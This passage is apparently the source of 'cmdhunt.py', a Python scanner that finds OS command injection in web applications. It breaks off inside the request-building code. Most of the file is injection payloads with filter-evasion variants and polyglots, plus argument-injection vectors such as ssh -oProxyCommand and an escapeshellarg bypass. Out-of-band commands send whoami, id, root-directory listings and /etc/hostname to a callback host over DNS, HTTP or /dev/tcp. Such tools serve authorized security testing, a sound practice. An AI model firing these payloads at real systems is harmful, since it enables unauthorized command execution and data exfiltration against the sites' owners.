#!/usr/bin/env python3
"""
cmdhunt.py - OS command injection, confirmed rather than guessed.

Command injection is the one class where timing-based detection has given the
whole field a bad name: a slow endpoint is not a shell. Every technique here
produces something the application could not have produced by echoing your
payload back.

  1. EXPANSION   `;echo cmdh$((9*7))unt;` comes back as cmdh63unt. Reflection
                 would return the literal `cmdh$((9*7))unt`, so the string
                 cmdh63unt exists only if a shell evaluated it. Windows gets
                 the same trick with %OS% -> Windows_NT. No callback needed,
                 no false positive possible.

  2. OOB         `;nslookup <token>.<your-domain>;` - the target resolves a
                 name only you can see. --dns-log greps your resolver's log
                 for every pending token, so a blind injection is confirmed
                 by the DNS resolution ALONE, with nothing in the HTTP
                 response. The exfiltrating variants put the output of
                 `whoami` / %USERNAME% INSIDE the hostname, so the log hands
                 you the executing user.

  3. TIMING      last resort, and only believed when it scales: a 5 second
                 sleep must take ~5s and a 10 second sleep ~10s on the same
                 point, against a measured baseline. One slow response is
                 never enough.

Injection points: query parameters, URL PATH SEGMENTS (every directory level,
not just the last), POST body parameters, JSON body values and request
headers - each disableable. The payload is appended to the existing value by
default, or replaces it with --replace. A value that is merely reflected can
never be reported, because the proof is that the value came back CHANGED.

SAFETY - every command executed is read-only: echo, an arithmetic expansion,
a DNS lookup or an HTTP GET to YOUR domain, and sleep. Nothing writes, deletes
or fetches remote code. That is deliberate: the goal is to prove the shell is
reachable, not to use it.

Stdlib only. TLS verification disabled. For authorized testing only.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import json
import os
import random
import re
import ssl
import statistics
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

VERSION = "1.4.0"
MAX_BODY = 1024 * 1024

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
_SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}

# Headers worth injecting into: they reach logging, image processing, git
# hooks, backup scripts and anything that shells out with the request context.
INJECTABLE_HEADERS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
    "X-Forwarded-Host", "X-Api-Version", "X-Request-Id", "Origin",
    "Accept-Language", "X-Client-IP", "True-Client-IP", "Forwarded",
]

# Values that look like a filename, a host or a command argument are the ones
# that end up in a shell. Parameters named like this go first.
HOT_PARAM_RX = re.compile(
    r"(?i)(cmd|command|exec|run|ping|host|hostname|ip|addr|target|url|uri|"
    r"file|filename|path|dir|folder|name|doc|document|image|img|photo|"
    r"upload|download|convert|export|import|print|log|backup|restore|"
    r"archive|zip|tar|compress|resize|thumb|format|type|ext|option|opt|"
    r"arg|args|param|query|search|q|input|data|action|do|func|function|"
    r"script|shell|process|job|task|mail|to|from|subject|domain|dns|"
    r"lookup|trace|traceroute|nmap|scan|check|test|debug)")


# Tried with --guess when a URL carries no parameter at all. Ordered by how
# often they end up in a shell, and kept short: each one costs a full payload
# set.
GUESS_PARAMS = ["cmd", "command", "exec", "host", "ip", "ping", "file",
                "filename", "path", "dir", "url", "target", "name", "query",
                "q", "search", "data", "input", "action", "func"]


# ----------------------------------------------------------------------------
# Payloads
#
# Every entry is (technique, platform, template, what proves it).
# {C} is the canary, {H} the OOB hostname, {S} the sleep length.
# ----------------------------------------------------------------------------

@dataclass
class Payload:
    technique: str          # expansion | oob | timing
    platform: str           # unix | windows
    template: str
    label: str
    needs_oob: bool = False
    seconds: int = 0


# -- 1. expansion: the value comes back changed, so a shell changed it -------
#
# `cmdh$((9*7))unt` -> cmdh63unt on any POSIX shell.
# `cmdh%OS%unt`     -> cmdhWindows_NTunt on cmd.exe.
# Reflection returns the template untouched, which is why this cannot be a
# false positive. Every obfuscation below keeps that property: whatever the
# command word looks like, what comes back is still 63 / Windows_NT.

UNIX_ARGS = "{C}$((9*7)){C}"
WIN_ARGS = "{C}%OS%{C}"


def unix_commands(level):
    """The proof command, written in as many ways as the filters deserve."""
    out = [("echo " + UNIX_ARGS, "plain")]
    if level >= 2:
        out += [
            ("e'c'ho " + UNIX_ARGS, "single quotes inside the command word"),
            ('e"c"ho ' + UNIX_ARGS, "double quotes inside the command word"),
            ("e\\cho " + UNIX_ARGS, "backslash inside the command word"),
            ("e$@cho " + UNIX_ARGS, "$@ inside the command word"),
            ("e$()cho " + UNIX_ARGS, "$() inside the command word"),
            ("echo${IFS}" + UNIX_ARGS, "${IFS} instead of a space"),
            ("echo$IFS$9" + UNIX_ARGS, "$IFS$9 instead of a space"),
            ("echo%09" + UNIX_ARGS, "tab instead of a space"),
            ("{echo," + UNIX_ARGS + "}", "brace expansion"),
            ("echo<<<" + UNIX_ARGS, "here-string instead of a space"),
        ]
    if level >= 3:
        out += [
            ("$'\\x65\\x63\\x68\\x6f' " + UNIX_ARGS,
             "hex-encoded command name"),
            ("X=$'\\x65\\x63\\x68\\x6f';$X " + UNIX_ARGS,
             "ANSI-C quoting into a variable"),
            ("/???/ec?o " + UNIX_ARGS, "wildcard path (/bin/echo)"),
            ("`echo ec`ho " + UNIX_ARGS,
             "command word assembled by substitution"),
            ("ec\\\n" + "ho " + UNIX_ARGS,
             "backslash-newline inside the command word"),
            ("eCHo " + UNIX_ARGS, "mixed case (case-insensitive filters)"),
        ]
    return out


def win_commands(level):
    out = [("echo " + WIN_ARGS, "plain")]
    if level >= 2:
        out += [
            ("eCHo " + WIN_ARGS, "random case"),
            ("e^cho " + WIN_ARGS, "caret escape inside the command word"),
            ("echo%PROGRAMFILES:~10,-5%" + WIN_ARGS,
             "substring expansion instead of a space"),
        ]
    if level >= 3:
        out += [
            ("@^e^c^h^o " + WIN_ARGS, "caret between every character"),
            ("c:\\*\\*32\\cmd.e?e /c echo " + WIN_ARGS,
             "wildcard path to cmd.exe"),
        ]
    return out


# How the command is glued to the value it is appended to. `#` terminates the
# rest of the original command line so leftover arguments cannot break the
# syntax - the "remove arguments after the injection" trick.
SEPARATORS_UNIX = [
    # No separator at all: if the value lands unquoted in a shell command,
    # arithmetic expansion alone proves it. One request, and it is the
    # cheapest detector there is - a shell that expands $(( )) also expands
    # $( ), so this is command injection even without a chaining character.
    (";{}", "semicolon", 1),
    (";{};#", "semicolon, rest commented out", 1),
    ("|{}", "pipe", 1),
    ("||{}", "or", 1),
    ("&&{}", "and", 1),
    ("&{}&", "background (&)", 1),
    ("`{}`", "backticks", 1),
    ("$({})", "subshell", 1),
    ("%0a{}%0a", "url-encoded newline", 1),
    ("';{};#", "single-quote break, rest commented out", 1),
    ('";{};#', "double-quote break, rest commented out", 1),
    ("\n{}\n", "raw newline", 2),
    ("%0d%0a{}%0a", "CRLF", 2),
    ("';{};'", "single-quote break, quote restored", 2),
    ('";{};"', "double-quote break, quote restored", 2),
    ("%0a{}%23", "newline, url-encoded #", 2),
    (";${{}}", "brace-wrapped", 3),
    ("\\\n{}", "backslash-newline before the command", 3),
    ("~+;{};#", "tilde expansion then command", 3),
]

SEPARATORS_WIN = [
    ("&{}&", "ampersand", 1),
    ("|{}", "pipe", 1),
    ("&&{}", "and", 1),
    ("||{}", "or", 1),
    ("%0a{}%0a", "url-encoded newline", 1),
    ('"&{}&"', "double-quote break", 1),
    ("&{}&::", "ampersand, rest commented out", 2),
    ("\n{}\n", "raw newline", 2),
    ("^&{}^&", "caret-escaped ampersand", 3),
]

# Level 2 and 3 obfuscations are only combined with the separators that carry
# them best - the full product would be hundreds of requests per parameter.
BEST_SEPARATORS_UNIX = [";{};#", ";{}", "|{}", "&&{}", "`{}`"]
BEST_SEPARATORS_WIN = ["&{}&", "|{}", "&&{}"]

# One payload, three contexts. Straight from the reference: valid whether the
# value lands unquoted, inside single quotes or inside double quotes.
POLYGLOTS_UNIX = [
    ("1;echo${IFS}" + UNIX_ARGS + ";#${IFS}';echo${IFS}" + UNIX_ARGS
     + ";#${IFS}\";echo${IFS}" + UNIX_ARGS + ";#${IFS}",
     "polyglot: unquoted / single / double quoted"),
    ("/*$(echo " + UNIX_ARGS + ")`echo " + UNIX_ARGS
     + "`*/-'/*$(echo " + UNIX_ARGS + ")`echo " + UNIX_ARGS + "` #*/-||'\""
     + "||\"/*`*/", "polyglot: comment-wrapped, multi context"),
]

# -- 2. out of band ----------------------------------------------------------
#
# The plain variants prove reachability. The exfiltrating ones put the output
# of a command inside the hostname, so the DNS query itself carries the answer.

def unix_oob_commands(level):
    out = [
        ("nslookup {H}", "nslookup"),
        # ping is present on far more images than nslookup, which ships in
        # dnsutils and is missing from most minimal containers
        ("ping -c 1 {H}", "ping"),
        ("curl -s http://{H}/", "curl"),
        ("wget -q -O- http://{H}/", "wget"),
        ("host {H}", "host"),
        ("getent hosts {H}", "getent"),
        # no external binary at all: bash resolves the name itself
        ("bash -c 'exec 3<>/dev/tcp/{H}/80'", "bash /dev/tcp (no binary)"),
        ("cat < /dev/tcp/{H}/80", "/dev/tcp redirection (no binary)"),
        ("dig {H}", "dig"),
        ("drill {H}", "drill"),
        ("nslookup `whoami`.{H}", "EXFIL: whoami in the hostname"),
        ("nslookup $(whoami).{H}", "EXFIL: whoami in the hostname (subshell)"),
        ("curl -s http://{H}/$(id|tr ' ' '-')", "EXFIL: id over HTTP"),
        ("for i in $(ls /);do host \"$i.{H}\";done",
         "EXFIL: one DNS query per entry of /"),
        ("nohup nslookup {H} >/dev/null 2>&1 &",
         "backgrounded, survives a parent timeout"),
    ]
    if level >= 2:
        out += [
            # the interpreter is usually there even when the DNS tools are not
            ("php -r 'gethostbyname(\"{H}\");'", "php gethostbyname"),
            ("python3 -c \"import socket;socket.gethostbyname('{H}')\"",
             "python3 gethostbyname"),
            ("perl -e 'use Socket;inet_aton(\"{H}\")'", "perl inet_aton"),
            ("nslookup${IFS}{H}", "nslookup, ${IFS} instead of a space"),
            ("nslookup$IFS$9{H}", "nslookup, $IFS$9 instead of a space"),
            ("{nslookup,{H}}", "nslookup, brace expansion"),
            ("n's'lookup {H}", "nslookup, quotes in the command word"),
            ("n\\slookup {H}", "nslookup, backslash in the command word"),
            ("cu$@rl -s http://{H}/", "curl, $@ in the command word"),
        ]
    if level >= 3:
        out += [
            ("/???/n?lookup {H}", "nslookup by wildcard path"),
            ("$'\\x63\\x75\\x72\\x6c' -s http://{H}/",
             "curl, hex-encoded command name"),
        ]
    return out


def win_oob_commands(level):
    out = [
        ("nslookup {H}", "nslookup"),
        ("ping -n 1 {H}", "ping"),
        ("certutil -urlcache -f http://{H}/ x", "certutil"),
        ("powershell -c \"iwr http://{H}/\"", "powershell iwr"),
        ("nslookup %USERNAME%.{H}", "EXFIL: username in the hostname"),
        ("nslookup %COMPUTERNAME%.{H}", "EXFIL: hostname in the hostname"),
    ]
    if level >= 2:
        out += [
            ("nsl^ookup {H}", "nslookup, caret escape"),
            ("nSLooKUp {H}", "nslookup, random case"),
        ]
    return out


# Argument injection: the value is appended to a command as an ARGUMENT, so
# no separator will ever help - but the right option does. Vectors from the
# Sonar catalogue. These only make sense with a callback.
ARGV_UNIX = [
    ("-oProxyCommand=curl${IFS}http://{H}/", "ssh -oProxyCommand"),
    ("-o|curl${IFS}http://{H}/", "psql -o|cmd"),
    ("--use-askpass=curl${IFS}http://{H}/", "wget/git --use-askpass"),
    ("--gpu-launcher=curl${IFS}http://{H}/", "chrome --gpu-launcher"),
    ("--upload-file=/etc/hostname --url=http://{H}/", "curl upload"),
    ("-F/dev/null -Fhttp://{H}/", "curl -F"),
    ("\uff02 --use-askpass=curl${IFS}http://{H}/ \uff02",
     "WorstFit: fullwidth quotes escape escapeshellarg"),
]

# -- 3. timing: only ever believed when it scales ----------------------------

TIMING_UNIX = [
    (";sleep {S};#", "sleep, rest commented out"),
    (";sleep {S};", "sleep"),
    ("|sleep {S}", "sleep via pipe"),
    ("`sleep {S}`", "sleep in backticks"),
    ("$(sleep {S})", "sleep in a subshell"),
    ("&&sleep {S}", "sleep after &&"),
    ("%0asleep {S}%0a", "sleep after a newline"),
    ("';sleep${IFS}{S};#", "sleep, single-quote break, IFS"),
    ('";sleep${IFS}{S};#', "sleep, double-quote break, IFS"),
    ("1;sleep${IFS}{S};#${IFS}';sleep${IFS}{S};#${IFS}\";sleep${IFS}{S};"
     "#${IFS}", "polyglot sleep (three quoting contexts)"),
]

TIMING_WIN = [
    ("&ping -n {S} 127.0.0.1&", "ping as a timer"),
    ("&timeout /t {S}&", "timeout"),
]


def build_payloads(platform, with_oob, with_timing, seconds, level=1):
    out = []
    fams = []
    if platform in ("auto", "unix"):
        fams.append("unix")
    if platform in ("auto", "windows"):
        fams.append("windows")

    for plat in fams:
        if plat == "unix":
            seps = SEPARATORS_UNIX
            best = BEST_SEPARATORS_UNIX
            cmds = unix_commands(level)
            oobs = unix_oob_commands(level)
            tims = TIMING_UNIX
            polys = POLYGLOTS_UNIX
        else:
            seps = SEPARATORS_WIN
            best = BEST_SEPARATORS_WIN
            cmds = win_commands(level)
            oobs = win_oob_commands(level)
            tims = TIMING_WIN
            polys = []

        # No separator at all: when the value lands unquoted inside a shell
        # command, arithmetic expansion alone proves a shell saw it - and a
        # shell that expands $(( )) also expands $( ). One request, and it is
        # the cheapest detector in the whole tool.
        out.append(Payload("expansion", plat,
                           UNIX_ARGS if plat == "unix" else WIN_ARGS,
                           "bare expansion, no separator needed"))
        plain_cmd, _ = cmds[0]
        for tpl, sep_label, sep_level in seps:
            if sep_level > level:
                continue
            out.append(Payload("expansion", plat, tpl.replace("{}", plain_cmd),
                               sep_label))
        # obfuscated command words, only on the separators that carry them
        for cmd, cmd_label in cmds[1:]:
            for tpl in best:
                out.append(Payload("expansion", plat, tpl.replace("{}", cmd),
                                   cmd_label))
        for tpl, label in polys:
            out.append(Payload("expansion", plat, tpl, label))

        if with_oob:
            # OOB payloads are fire-and-forget, but they still cost a request
            # each: the separator set widens with the level, not the command
            # set times the separator set.
            wide = [t for t, _, l in seps if l <= level]
            narrow = best[:3]
            for cmd, cmd_label in oobs:
                first = cmd_label in ("nslookup", "curl", "ping")
                for tpl in (wide if first else narrow):
                    out.append(Payload("oob", plat, tpl.replace("{}", cmd),
                                       cmd_label, needs_oob=True))
            if plat == "unix" and level >= 2:
                for tpl, label in ARGV_UNIX:
                    out.append(Payload("argv", plat, tpl, label,
                                       needs_oob=True))

        if with_timing:
            for tpl, label in tims:
                out.append(Payload("timing", plat, tpl, label,
                                   seconds=seconds))
    # de-duplicate identical templates
    seen, uniq = set(), []
    for p in out:
        if p.template in seen:
            continue
        seen.add(p.template)
        uniq.append(p)
    return uniq


# ----------------------------------------------------------------------------
# Output
# ----------------------------------------------------------------------------

class Colors:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GREY = "\033[90m"

    @classmethod
    def disable(cls):
        for a in ("RESET", "BOLD", "DIM", "RED", "GREEN", "YELLOW", "BLUE",
                  "MAGENTA", "CYAN", "GREY"):
            setattr(cls, a, "")


def sev_paint(sev):
    return {CRIT: Colors.RED + Colors.BOLD, HIGH: Colors.RED,
            MED: Colors.YELLOW, LOW: Colors.CYAN,
            INFO: Colors.GREY}.get(sev, "")


ANSI_RX = re.compile(r"\x1b\[[0-9;]*m")


@dataclass
class Finding:
    sev: str
    title: str
    url: str = ""
    impact: str = ""
    proof: list = field(default_factory=list)
    note: str = ""
    poc: str = ""
    chain: str = ""


class Reporter:
    def __init__(self, level=0, logfile=None):
        self.level = level
        self.lock = threading.Lock()
        self.fh = None
        if logfile:
            try:
                self.fh = open(logfile, "a", encoding="utf-8")
            except Exception as e:
                sys.stderr.write(f"cannot open {logfile}: {e}\n")

    def _emit(self, text):
        with self.lock:
            sys.stdout.write(text + "\n")
            sys.stdout.flush()
            if self.fh:
                try:
                    self.fh.write(ANSI_RX.sub("", text) + "\n")
                    self.fh.flush()
                except Exception:
                    pass

    def line(self, text=""):
        self._emit(text)

    def log_only(self, text):
        with self.lock:
            if self.fh:
                try:
                    self.fh.write(ANSI_RX.sub("", text) + "\n")
                    self.fh.flush()
                except Exception:
                    pass

    def banner(self, msg):
        self._emit(f"\n{Colors.BOLD}{Colors.BLUE}=== {msg} ==={Colors.RESET}")

    def finding(self, f: Finding):
        C, p = Colors, sev_paint(f.sev)
        out = [f"\n{p}[{f.sev}]{C.RESET} {C.BOLD}{f.title}{C.RESET}"]
        if f.url:
            out.append(f"  {C.DIM}URL     :{C.RESET} {f.url}")
        if f.impact:
            out.append(f"  {C.DIM}Impact  :{C.RESET} {f.impact}")
        if f.proof:
            out.append(f"  {C.DIM}Proof   :{C.RESET} {len(f.proof)} item(s)")
            for item in f.proof[:20]:
                out.append(f"      {C.GREEN}{item}{C.RESET}")
        if f.note:
            out.append(f"  {C.DIM}Note    :{C.RESET} {f.note}")
        if f.chain:
            out.append(f"  {C.DIM}Chain   :{C.RESET} {C.MAGENTA}{f.chain}"
                       f"{C.RESET}")
        if f.poc:
            lines = f.poc.split("\n")
            out.append(f"  {C.DIM}PoC     :{C.RESET} {lines[0]}")
            for extra in lines[1:]:
                out.append(f"            {extra}")
        self._emit("\n".join(out))

    def test(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.DIM}[test] {msg}{Colors.RESET}")

    def info(self, msg):
        if self.level >= 1:
            self._emit(f"{Colors.CYAN}[info]{Colors.RESET} {msg}")

    def debug(self, msg):
        if self.level >= 2:
            self._emit(f"{Colors.GREY}[dbg] {msg}{Colors.RESET}")

    def skipped(self, msg):
        if self.level >= 2:
            self._emit(f"{Colors.GREY}[skip] {msg}{Colors.RESET}")

    def warn(self, msg):
        self._emit(f"{Colors.YELLOW}[warn]{Colors.RESET} {msg}")

    def error(self, msg):
        self._emit(f"{Colors.RED}[err ]{Colors.RESET} {msg}")


class Status:
    def __init__(self, rep, total, interval=30.0, enabled=True):
        self.rep, self.total, self.interval = rep, total, interval
        self.enabled = enabled and total > 0
        self.done = 0
        self.findings = 0
        self.start = time.time()
        self.lock = threading.Lock()
        self._stop = threading.Event()
        self.thread = None

    def start_thread(self):
        if not self.enabled:
            return
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def _loop(self):
        while not self._stop.wait(self.interval):
            self.emit()

    def target_done(self):
        with self.lock:
            self.done += 1

    def record(self, n=1):
        with self.lock:
            self.findings += n

    def emit(self):
        if not self.enabled:
            return
        el = int(time.time() - self.start)
        with self.lock:
            done, total, f = self.done, self.total, self.findings
        self.rep.line(f"{Colors.BLUE}[status {el // 60:02d}:{el % 60:02d}]"
                      f"{Colors.RESET}  tested {done}/{total}  "
                      f"remaining {total - done}  findings {f}")

    def stop(self):
        self._stop.set()
        if self.thread:
            self.thread.join(timeout=1)


# ----------------------------------------------------------------------------
# HTTP
# ----------------------------------------------------------------------------

@dataclass
class Response:
    status: int = 0
    body: str = ""
    headers: dict = field(default_factory=dict)
    error: str = ""
    elapsed: float = 0.0

    @property
    def ok(self):
        return not self.error


class Rate:
    def __init__(self, gap):
        self.gap = gap
        self.last = 0.0
        self.lock = threading.Lock()

    def wait(self):
        if self.gap <= 0:
            return
        with self.lock:
            delta = self.last + self.gap - time.time()
            if delta > 0:
                time.sleep(delta)
            self.last = time.time()


class Http:
    def __init__(self, timeout=20.0, proxy=None, headers=None, delay=0.0,
                 rep: Reporter = None):
        self.timeout = timeout
        self.proxy = proxy
        self.rep = rep
        self.rate = Rate(delay)
        self.extra = {}
        for h in headers or []:
            if ":" in h:
                k, v = h.split(":", 1)
                self.extra[k.strip()] = v.strip()
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self._opener = None
        self._lock = threading.Lock()
        self.count = 0

    def opener(self):
        with self._lock:
            if self._opener is None:
                handlers = [urllib.request.HTTPSHandler(context=self.ctx)]
                if self.proxy:
                    handlers.append(urllib.request.ProxyHandler(
                        {"http": self.proxy, "https": self.proxy}))
                else:
                    handlers.append(urllib.request.ProxyHandler({}))
                self._opener = urllib.request.build_opener(*handlers)
            return self._opener

    def request(self, method, url, body=None, headers=None,
                max_read=MAX_BODY, timeout=None) -> Response:
        with self._lock:
            self.count += 1
        self.rate.wait()
        hdrs = {"User-Agent": DEFAULT_UA, "Accept": "*/*",
                "Accept-Encoding": "identity"}
        hdrs.update(self.extra)
        hdrs.update(headers or {})
        data = body.encode("utf-8", "replace") if isinstance(body, str) else body
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in hdrs.items():
            if v is None:
                continue
            try:
                req.remove_header(k)
                req.add_header(k, v)
            except Exception:
                pass
        t0 = time.time()
        try:
            with self.opener().open(req,
                                    timeout=timeout or self.timeout) as r:
                raw = r.read(max_read)
                return Response(status=r.status,
                                body=raw.decode("utf-8", "replace"),
                                headers=dict(r.headers),
                                elapsed=time.time() - t0)
        except urllib.error.HTTPError as e:
            try:
                raw = e.read(max_read)
            except Exception:
                raw = b""
            return Response(status=e.code, body=raw.decode("utf-8", "replace"),
                            headers=dict(e.headers or {}),
                            elapsed=time.time() - t0)
        except Exception as e:
            return Response(error=f"{type(e).__name__}: {e}",
                            elapsed=time.time() - t0)


# ----------------------------------------------------------------------------
# Targets and injection points
# ----------------------------------------------------------------------------

HOP_BY_HOP = {"connection", "keep-alive", "proxy-authenticate", "te",
              "trailer", "transfer-encoding", "upgrade", "content-length",
              "accept-encoding", "host"}


@dataclass
class Point:
    kind: str               # query | body | json | header | path
    name: str
    original: str = ""
    path: tuple = ()        # for json: the key path
    index: int = -1         # for path: which segment

    def label(self):
        if self.kind == "json":
            return f"json:{'.'.join(map(str, self.path))}"
        if self.kind == "path":
            return f"path[{self.index}]:{self.name or '/'}"
        return f"{self.kind}:{self.name}"


@dataclass
class Target:
    url: str
    method: str = "GET"
    headers: dict = field(default_factory=dict)
    body: str = ""
    body_kind: str = ""      # form | json | raw


def parse_raw_request(path, force_ssl=False):
    with open(path, "rb") as fh:
        raw = fh.read().decode("utf-8", "replace")
    raw = raw.replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = [l for l in head.split("\n") if l.strip()]
    if not lines:
        raise ValueError(f"{path}: empty request file")
    parts = lines[0].split()
    if len(parts) < 2:
        raise ValueError(f"{path}: cannot parse the request line")
    method, target = parts[0].upper(), parts[1]
    headers, host, ctype = {}, "", ""
    for line in lines[1:]:
        if ":" not in line:
            continue
        k, v = line.split(":", 1)
        k, v = k.strip(), v.strip()
        if k.lower() == "host":
            host = v
            continue
        if k.lower() == "content-type":
            ctype = v.lower()
        if k.lower() in HOP_BY_HOP:
            continue
        headers[k] = v
    if target.startswith("http://") or target.startswith("https://"):
        url = target
    else:
        scheme = "https" if force_ssl else "http"
        if not force_ssl:
            for ref in ("Origin", "Referer"):
                if headers.get(ref, "").startswith("https://"):
                    scheme = "https"
                    break
            else:
                if host.endswith(":443"):
                    scheme = "https"
        if not host:
            raise ValueError(f"{path}: no Host header and no absolute URL")
        url = f"{scheme}://{host}{target}"
    kind = ""
    if body.strip():
        if "json" in ctype or body.strip().startswith(("{", "[")):
            kind = "json"
        elif "urlencoded" in ctype or re.match(r"^[^=&\s]+=", body.strip()):
            kind = "form"
        else:
            kind = "raw"
    return Target(url=url, method=method, headers=headers,
                  body=body.strip(), body_kind=kind)


def json_paths(obj, prefix=()):
    """Every string/number leaf in a JSON document."""
    out = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            out += json_paths(v, prefix + (k,))
    elif isinstance(obj, list):
        for i, v in enumerate(obj[:10]):
            out += json_paths(v, prefix + (i,))
    elif isinstance(obj, (str, int, float)) and not isinstance(obj, bool):
        out.append((prefix, obj))
    return out


def json_set(obj, path, value):
    import copy
    clone = copy.deepcopy(obj)
    ref = clone
    for key in path[:-1]:
        ref = ref[key]
    ref[path[-1]] = value
    return clone


# ----------------------------------------------------------------------------
# The hunter
# ----------------------------------------------------------------------------

class CmdHunter:
    def __init__(self, http: Http, rep: Reporter, args, status=None):
        self.http = http
        self.rep = rep
        self.args = args
        self.status = status
        self.findings = []
        self.oob_rows = []
        self.oob_reported = set()      # (target, point) already reported
        self.lock = threading.Lock()
        self.counter = 0
        self.runid = "".join(random.choices("abcdefghijklmnopqrstuvwxyz"
                                            "0123456789", k=5))

    # -- reporting ----------------------------------------------------------

    def add(self, f: Finding):
        with self.lock:
            self.findings.append(f)
        self.rep.finding(f)
        if self.status:
            self.status.record()

    # Every token and every canary carries this, so a single grep on
    # "cmd-" pulls everything this tool produced out of a DNS log, an access
    # log or an application log. The random run id keeps the tokens of one
    # run from matching a log line left by an earlier one.
    TOKEN_PREFIX = "cmd-"

    def next_token(self):
        """cmd-<run id>-<counter>: DNS-safe, unique per run, greppable."""
        with self.lock:
            self.counter += 1
            n = self.counter
        return f"{self.TOKEN_PREFIX}{self.runid}-{n:04d}"

    def record_oob(self, token, target, point, payload, request_repr):
        row = {"token": token, "host": f"{token}.{self.args.blind}",
               "target": target, "point": point.label(),
               "technique": payload.technique, "platform": payload.platform,
               "payload": payload.label, "time": time.strftime("%FT%T"),
               "request": request_repr[:400], "confirmed": False}
        with self.lock:
            self.oob_rows.append(row)

    def read_dns_log(self):
        try:
            with open(self.args.dns_log, encoding="utf-8",
                      errors="replace") as fh:
                return fh.read()
        except Exception as e:
            self.rep.warn(f"cannot read {self.args.dns_log}: {e}")
            return ""

    def check_dns_log(self, target=None):
        """
        Plain substring match of every pending token against the log. A
        resolution is the confirmation: the target looked up a name that
        exists nowhere else, so a shell ran the command even though the HTTP
        response said nothing.
        """
        if not self.args.dns_log or not self.args.blind:
            return 0
        body = self.read_dns_log()
        if not body:
            return 0
        with self.lock:
            pending = [r for r in self.oob_rows if not r["confirmed"]
                       and (target is None or r["target"] == target)]
        hits = [r for r in pending if r["token"] in body]
        if not hits:
            return 0
        grouped = {}
        for r in hits:
            r["confirmed"] = True
            grouped.setdefault((r["target"], r["point"]), []).append(r)
        for (tgt_url, point), rows in list(grouped.items()):
            # the incremental check and the final one must not report the
            # same injection point twice
            with self.lock:
                if (tgt_url, point) in self.oob_reported:
                    grouped.pop((tgt_url, point))
                    continue
                self.oob_reported.add((tgt_url, point))
        for (tgt_url, point), rows in grouped.items():
            row = rows[0]
            exfil = ""
            for r2 in rows:
                m = re.search(r"([A-Za-z0-9._-]{1,60})\."
                              + re.escape(r2["token"]), body)
                if m and m.group(1) not in ("", "www"):
                    exfil, row = m.group(1), r2
                    break
            self.add(Finding(
                sev=CRIT,
                title=f"Command injection confirmed OUT OF BAND in {point}",
                url=tgt_url,
                impact="The target resolved a name that exists nowhere else. "
                       "Nothing in the HTTP response was interpreted: the "
                       "server ran the command and reached out.",
                proof=[f"callback host: {row['host']}",
                       f"found in: {self.args.dns_log}",
                       f"platform: {row['platform']}",
                       f"payload that fired: {row['payload']}",
                       f"{len(rows)} payload(s) on this point called back: "
                       f"{', '.join(sorted({r['payload'] for r in rows}))[:150]}"]
                      + ([f"EXFILTRATED: {exfil}"] if exfil else []),
                poc=row["request"]))
        return len(grouped)

    # -- building requests --------------------------------------------------

    def points_of(self, tgt: Target):
        """Every place a value can be injected, best candidates first."""
        pts = []
        split = urllib.parse.urlsplit(tgt.url)
        only = None
        if self.args.param:
            only = {p.strip() for p in self.args.param.split(",") if p.strip()}

        params = urllib.parse.parse_qs(split.query, keep_blank_values=True)
        for name, vals in params.items():
            pts.append(Point("query", name, vals[0] if vals else ""))

        if not params and not self.args.no_guess:
            for name in GUESS_PARAMS:
                pts.append(Point("query", name, "1"))
            self.rep.info(f"no parameter on this URL: guessing "
                          f"{len(GUESS_PARAMS)} common names")

        # path segments: /export/report/2026.pdf has three of them, and the
        # one that reaches a shell is rarely the last
        if not self.args.no_path:
            segs = [seg for seg in split.path.split("/") if seg]
            for i, seg in enumerate(segs):
                pts.append(Point("path", seg, seg, index=i))

        if tgt.body and not self.args.no_post:
            if tgt.body_kind == "form":
                for name, vals in urllib.parse.parse_qs(
                        tgt.body, keep_blank_values=True).items():
                    pts.append(Point("body", name, vals[0] if vals else ""))
            elif tgt.body_kind == "json":
                try:
                    obj = json.loads(tgt.body)
                    for path, val in json_paths(obj):
                        pts.append(Point("json", str(path[-1]), str(val),
                                         path=path))
                except Exception:
                    pass

        if not self.args.no_headers:
            for h in INJECTABLE_HEADERS:
                pts.append(Point("header", h, tgt.headers.get(h, "")))

        if only:
            pts = [p for p in pts if p.name in only]
            self.rep.info(f"--param: {len(pts)} point(s) kept")

        pts.sort(key=lambda p: (0 if HOT_PARAM_RX.search(p.name) else 1,
                                0 if p.kind not in ("header", "path") else 1))
        return pts

    def build(self, tgt: Target, point: Point, value, append=None):
        """-> (method, url, body, headers, repr)"""
        if append is None:
            append = not self.args.replace
        url, body = tgt.url, tgt.body
        headers = dict(tgt.headers)
        split = urllib.parse.urlsplit(url)

        if point.kind == "path":
            segs = split.path.split("/")
            # parse_qs-style indexing skips the empty leading segment
            real = [i for i, s2 in enumerate(segs) if s2]
            if point.index >= len(real):
                return None
            at = real[point.index]
            base = (segs[at] if append else "")
            segs = list(segs)
            segs[at] = base + urllib.parse.quote(value, safe="")
            url = urllib.parse.urlunsplit(
                (split.scheme, split.netloc, "/".join(segs), split.query,
                 split.fragment))
        elif point.kind == "query":
            q = urllib.parse.parse_qs(split.query, keep_blank_values=True)
            base = (point.original if append else "")
            q[point.name] = [base + value]
            url = urllib.parse.urlunsplit(
                (split.scheme, split.netloc, split.path,
                 urllib.parse.urlencode(q, doseq=True), split.fragment))
        elif point.kind == "body":
            q = urllib.parse.parse_qs(body, keep_blank_values=True)
            base = (point.original if append else "")
